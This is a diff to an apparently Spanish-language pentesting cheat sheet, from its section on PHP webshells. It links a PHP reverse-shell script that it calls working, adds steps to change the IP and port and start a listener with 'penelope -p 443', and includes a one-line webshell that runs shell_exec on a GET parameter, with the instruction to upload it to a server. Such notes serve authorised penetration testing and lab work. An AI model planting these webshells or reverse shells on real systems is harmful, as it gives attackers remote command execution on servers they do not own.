@@ -306,8 +306,15 @@ echo "PHP_EXEC_OK";
 ## PHP — Webshell básica
 
 * [reverse.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) <-- Funcional 
+```bash 
+# Para la revershell de arriba se neceita:
+- Cambiar la IP y el puerto
+
+❯ penelope -p 443   # Ponerse en escucha 
+```
 
 ```php
+# Revershells clásicas 
 # cmd.php → subir al servidor y acceder desde el navegador
 <?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
 
